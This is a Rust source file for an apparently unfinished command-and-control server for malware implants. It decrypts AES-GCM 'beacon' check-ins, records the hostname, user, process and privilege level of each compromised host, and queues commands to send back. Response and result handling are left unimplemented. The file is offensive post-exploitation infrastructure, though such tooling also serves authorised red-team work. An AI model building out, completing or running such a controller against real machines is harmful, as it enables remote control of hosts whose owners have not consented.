use std::collections::HashMap;
use std::sync::Arc;
use std::{env::args, net::SocketAddr};

use aes_gcm::{Aes256Gcm, KeyInit, Nonce, aead::Aead};
use axum::{Router, routing::post};
use axum::body::Bytes;
use axum::http::StatusCode;
use axum::extract::State;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use tokio::sync::RwLock;
use sha2::{Digest, Sha256};

#[derive(Clone)]
struct Crypto {
    cipher: Aes256Gcm,
}

impl Crypto {
    fn new(secret: &str) -> Self {
        let mut hasher = Sha256::new();
        hasher.update(secret.as_bytes());
        let key = hasher.finalize();
        let cipher = Aes256Gcm::new_from_slice(&key).expect("Invalid Key");
        Self { cipher }
    }

    fn encrypt(&self, plaintext: &[u8]) -> Result<Vec<u8>, String> {
        let nonce_bytes: [u8; 12] = rand::random();
        let nonce = Nonce::from_slice(&nonce_bytes);
        let ciphtertext = self.cipher.encrypt(nonce, plaintext).map_err(|e| format!("encrypt error: {:?}", e))?;
       let mut result = nonce_bytes.to_vec();
       result.extend(ciphtertext);
       Ok(result) 
    }

    fn decrypt(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        if data.len() < 12 {
            return Err("too short".into());
        }
        let nonce = Nonce::from_slice(&data[..12]);
        self.cipher.decrypt(nonce, &data[12..]).map_err(|e| format!("decyrpt error: {:?}", e))
    }
}

#[derive(Debug, Deserialize)]
struct BeaconData {
    session_id: String,
    hostname: String,
    username: String,
    os: String,
    pid: u32,
    process: String,
    arch: String,
    integrity: String,
    timestamp: i64,
    metadata: serde_json::Value,
}

#[derive(Debug, Clone)]
struct Session {
    id: String,
    hostname: String,
    username: String,
    os: String,
    pid: u32,
    process: String,
    arch: String,
    integrity: String,
    first_seen: DateTime<Utc>,
    last_seen: DateTime<Utc>,
    checkins: u64,
}

#[derive(Debug, Clone, Serialize)]
struct CommandData {
    id: String,
    #[serde(rename = "type")]
    command_type: String,
    args: Vec<String>,
    timeout: Option<u64>,
}

struct AppState {
    crypto: Crypto,
    sessions: RwLock<HashMap<String, Session>>,
    pending_command: RwLock<HashMap<String, Vec<CommandData>>>,
    results: RwLock<Vec<(String, String, bool, String)>>,
}

async fn handle_beacon(State(state): State<Arc<AppState>>, body: Bytes) -> Result<Bytes, StatusCode> {
    // Decrypt
    let plaintext = state.crypto.decrypt(&body).map_err(|e| {
        eprintln!("[x] Decrypt failed: {}", e);
        StatusCode::BAD_REQUEST
    })?;

    // Parse beacon data
    let data: BeaconData = serde_json::from_slice(&plaintext).map_err(|e| {
        eprintln!("[x] JSON parse failed: {}", e);
        StatusCode::BAD_REQUEST
    })?;

    let now = Utc::now();

    // Update or create session
    let mut sessions = state.sessions.write().await;
    let is_new = !sessions.contains_key(&data.session_id);

    let session = sessions.entry(data.session_id.clone()).or_insert_with(|| {
        Session {
            id: data.session_id.clone(),
            hostname: data.hostname.clone(),
            username: data.username.clone(),
            os: data.os.clone(),
            pid: data.pid,
            process: data.process.clone(),
            arch: data.arch.clone(),
            integrity: data.integrity.clone(),
            first_seen: now,
            last_seen: now,
            checkins: 0,
        }
    });
    session.last_seen = now;
    session.checkins += 1;

    if is_new {
        println!("* NEW SESSION     {}", data.session_id);
        println!("    -> {}@{}", data.username, data.hostname);
        println!("    -> {} | PID {} | {}", data.os, data.pid, data.arch);
        println!("    -> Integrity: {}", data.integrity);
    } 
    drop(sessions);

    // Check if pending commands
    let mut pending = state.pending_command.write().await;
    let commands = pending.remove(&data.session_id).unwrap_or_default();

    if !commands.is_empty() {
        println!("  ^ Sending {} command(s) to {}", commands.len(), data.session_id);
        for cmd in &commands {
            println!("    * [{}] {} {:?}", cmd.id, cmd.command_type, cmd.args);
        }
    }

    // TODO: Build response
    unimplemented!()
}

async fn handle_result() {
    unimplemented!()
}

#[tokio::main]
async fn main() {
    let port: u16 = args()
        .position(|a| a == "--port")
        .and_then(|i| args().nth(i + 1))
        .and_then(|s| s.parse().ok())
        .unwrap_or(1337);
    let secret = args()
        .position(|a| a == "--secret")
        .and_then(|i| args().nth(i + 1))
        .unwrap_or_else(|| "super-secret-key".to_string());

    let state = Arc::new(AppState {
        crypto: Crypto::new(&secret),
        sessions: RwLock::new(HashMap::new()),
        pending_command: RwLock::new(HashMap::new()),
        results: RwLock::new(Vec::new()),
    });

    let app = Router::new()
        .route("/api/beacon", post(handle_beacon))
        .route("/api/result", post(handle_result))
        .with_state(state.clone());

    let addr = SocketAddr::from(([0, 0, 0, 0], port));

    println!("\n  >    Listening on {}", format!("http://0.0.0.0:{}", port));
    println!("  >    Secret: {}\n", secret);

    tokio::spawn(async move {
        let listener = tokio::net::TcpListener::bind(&addr).await.unwrap();
        axum::serve(listener, app.into_make_service())
            .await
            .unwrap();
    });

    unimplemented!()
}
